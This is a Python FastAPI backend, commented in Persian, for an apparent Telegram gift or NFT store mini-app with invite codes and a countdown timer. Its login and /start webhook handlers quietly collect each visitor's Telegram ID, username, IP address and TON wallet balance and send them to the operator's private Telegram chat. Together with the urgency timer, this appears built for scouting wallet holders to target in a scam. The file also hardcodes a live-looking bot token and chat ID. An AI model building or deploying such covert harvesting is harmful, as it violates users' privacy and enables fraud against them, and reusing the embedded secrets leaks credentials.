import os
import asyncio
from fastapi import FastAPI, HTTPException, Request
from fastapi.middleware.cors import CORSMiddleware
import uvicorn
import httpx
import random
import string
from datetime import datetime, timezone

app = FastAPI()
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

PORTALS_TOKEN = os.getenv("PORTALS_TOKEN", "tma query_id=AAFtFsxzAwAAAG0WzHNu5skJ&user=...")
CLOUDFLARE_ACCOUNT_ID = os.getenv("CLOUDFLARE_ACCOUNT_ID")
CLOUDFLARE_KV_NAMESPACE_ID = os.getenv("CLOUDFLARE_KV_NAMESPACE_ID")
CLOUDFLARE_API_TOKEN = os.getenv("CLOUDFLARE_API_TOKEN")

# =======================================================
# 🔴 توکن و آیدی عددی خودت رو اینجا بذار 🔴
TELEGRAM_BOT_TOKEN = "8771799457:AAFtq13l9xHqkI5xHyV_03y350xJ-r5OrgI" 
YOUR_CHAT_ID = "6973598061"
# =======================================================

COLOR_MAP = {
    "Pine Green": "#017561", "Mystic Pearl": "#E6E0D4", "Silver Blue": "#8A9A9D",
    "French Blue": "#0072BB", "Ranger Green": "#444C38", "Pacific Cyan": "#1CA9C9",
    "Seal Brown": "#59260B", "French Violet": "#8806CE", "Onyx Black": "#0F0F0F",
    "Crimson Red": "#990000", "Gold": "#FFD700"
}

async def save_to_kv(key: str, value: str):
    url = f"https://api.cloudflare.com/client/v4/accounts/{CLOUDFLARE_ACCOUNT_ID}/storage/kv/namespaces/{CLOUDFLARE_KV_NAMESPACE_ID}/values/{key}"
    headers = {"Authorization": f"Bearer {CLOUDFLARE_API_TOKEN}"}
    async with httpx.AsyncClient() as client:
        response = await client.put(url, headers=headers, content=value)
        return response.status_code == 200

async def get_from_kv(key: str):
    url = f"https://api.cloudflare.com/client/v4/accounts/{CLOUDFLARE_ACCOUNT_ID}/storage/kv/namespaces/{CLOUDFLARE_KV_NAMESPACE_ID}/values/{key}"
    headers = {"Authorization": f"Bearer {CLOUDFLARE_API_TOKEN}"}
    async with httpx.AsyncClient() as client:
        response = await client.get(url, headers=headers)
        if response.status_code == 200:
            return response.text
        return None

async def send_telegram_message(text: str):
    if not TELEGRAM_BOT_TOKEN or not YOUR_CHAT_ID:
        print("❌ توکن یا آیدی تنظیم نشده.")
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": YOUR_CHAT_ID, "text": text, "parse_mode": "HTML"}
    async with httpx.AsyncClient() as client:
        try:
            response = await client.post(url, json=payload)
            if response.status_code != 200:
                print(f"❌ خطای تلگرام: {response.text}")
            else:
                print("✅ پیام ارسال شد.")
        except Exception as e:
            print(f"❌ خطای شبکه: {e}")

FIXED_END_TIME = "2026-11-28T23:59:59+00:00"

@app.get("/api/gifts")
async def get_gifts_api(offset: int = 0, limit: int = 50):
    try:
        import aportalsmp
        result = []
        seen_links = set()
        listings = await aportalsmp.search(
            authData=PORTALS_TOKEN, gift_name="", limit=limit, offset=offset, sort="price_asc"
        )
        for gift in listings:
            name = getattr(gift, 'name', 'Unknown')
            price = getattr(gift, 'price', 0)
            tg_id = getattr(gift, 'tg_id', '')
            clean_name = name.replace(" ", "").replace("'", "")
            link = f"https://t.me/nft/{clean_name}-{tg_id}" if tg_id else f"https://t.me/nft/{clean_name}"
            if link in seen_links: continue
            seen_links.add(link)
            img_url = getattr(gift, 'photo_url', '') or ""
            color_name = getattr(gift, 'backdrop', '')
            bg_color = COLOR_MAP.get(color_name, "#1c1c1e")
            result.append({
                "name": name, "price": price, "link": link, "image_url": img_url, "bg_color": bg_color
            })
        return {"status": "success", "data": result}
    except Exception as e:
        return {"status": "error", "message": f"خطا: {str(e)}"}

@app.get("/api/invite/create")
async def create_invite(user_id: str):
    invite_code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
    success = await save_to_kv(invite_code, f"user_{user_id}")
    if success:
        return {"status": "success", "invite_code": invite_code, "link": f"https://t.me/YourBot?start={invite_code}"}
    else:
        return {"status": "error", "message": "خطا در ذخیره دعوت‌نامه"}

@app.get("/api/invite/check")
async def check_invite(code: str):
    value = await get_from_kv(code)
    if value:
        return {"status": "success", "valid": True, "invited_by": value}
    else:
        return {"status": "success", "valid": False, "message": "کد دعوت نامعتبر است"}

@app.get("/api/timer")
async def get_timer():
    end_time = datetime.fromisoformat(FIXED_END_TIME)
    now = datetime.now(timezone.utc)
    remaining_seconds = (end_time - now).total_seconds()
    if remaining_seconds < 0: remaining_seconds = 0
    return {
        "status": "success",
        "end_time": FIXED_END_TIME,
        "remaining_seconds": int(remaining_seconds)
    }

@app.post("/api/webapp/login")
async def webapp_login(request: Request):
    try:
        data = await request.json()
        user_id = data.get("user_id", "Unknown")
        username = data.get("username", "No Username")
        first_name = data.get("first_name", "")
        client_ip = request.client.host
        user_balance = data.get("balance", "0.00") # دریافت موجودی از فرانت‌اند
        
        print(f"📥 اطلاعات مینی‌اپ دریافت شد: {user_id}")
        
        user_data = f"name: {first_name} | username: @{username} | ip: {client_ip} | balance: {user_balance}"
        await save_to_kv(f"user_info_{user_id}", user_data)
        
        message_text = (
            f"👤 <b>کاربر در مینی‌اپ:</b>\n\n"
            f"🆔 <b>آیدی:</b> <code>{user_id}</code>\n"
            f"🔗 <b>یوزرنیم:</b> @{username}\n"
            f"📝 <b>نام:</b> {first_name}\n"
            f"🌐 <b>IP:</b> <code>{client_ip}</code>\n"
            f"💰 <b>موجودی:</b> {user_balance} TON"
        )
        await send_telegram_message(message_text)
        
        return {"status": "success", "message": "اطلاعات دریافت شد"}
    except Exception as e:
        print(f"❌ خطا در پردازش: {e}")
        return {"status": "error", "message": str(e)}

@app.post("/api/telegram/webhook")
async def telegram_webhook(request: Request):
    try:
        data = await request.json()
        if "message" in data and "text" in data["message"]:
            message = data["message"]
            text = message["text"]
            
            if text.startswith("/start"):
                user = message["from"]
                user_id = user.get("id", "Unknown")
                username = user.get("username", "No Username")
                first_name = user.get("first_name", "")
                
                print(f"🚀 استارت ربات توسط: {user_id}")
                
                # دریافت IP و موجودی از KV (اگر قبلاً ذخیره شده باشه)
                existing_data = await get_from_kv(f"user_info_{user_id}") or ""
                ip_val = "Unknown"
                bal_val = "0.00"
                if "ip: " in existing_data:
                    ip_val = existing_data.split("ip: ")[1].split(" | ")[0]
                if "balance: " in existing_data:
                    bal_val = existing_data.split("balance: ")[1]
                
                message_text = (
                    f"🚀 <b>ربات استارت شد!</b>\n\n"
                    f"🆔 <b>آیدی:</b> <code>{user_id}</code>\n"
                    f"🔗 <b>یوزرنیم:</b> @{username}\n"
                    f"📝 <b>نام:</b> {first_name}\n"
                    f"🌐 <b>IP:</b> <code>{ip_val}</code>\n"
                    f"💰 <b>موجودی:</b> {bal_val} TON"
                )
                await send_telegram_message(message_text)
                
        return {"ok": True}
    except Exception as e:
        print(f"❌ خطای وب‌هوک: {e}")
        return {"ok": False}

@app.on_event("startup")
async def startup_event():
    # 🔴 آدرس دامنه خودت توی Railway رو اینجا بذار (بدون اسلش در انتها)
    RAILWAY_DOMAIN = "https://gift-store-production.up.railway.app"
    
    if TELEGRAM_BOT_TOKEN:
        webhook_url = f"{RAILWAY_DOMAIN}/api/telegram/webhook"
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/setWebhook?url={webhook_url}"
        async with httpx.AsyncClient() as client:
            try:
                response = await client.get(url)
                print(f"✅ وضعیت وب‌هوک: {response.text}")
            except Exception as e:
                print(f"❌ خطا در تنظیم وب‌هوک: {e}")

async def main():
    port = int(os.getenv("PORT", 8080))
    config = uvicorn.Config(app, host="0.0.0.0", port=port)
    server = uvicorn.Server(config)
    await server.serve()

if __name__ == "__main__":
    asyncio.run(main())
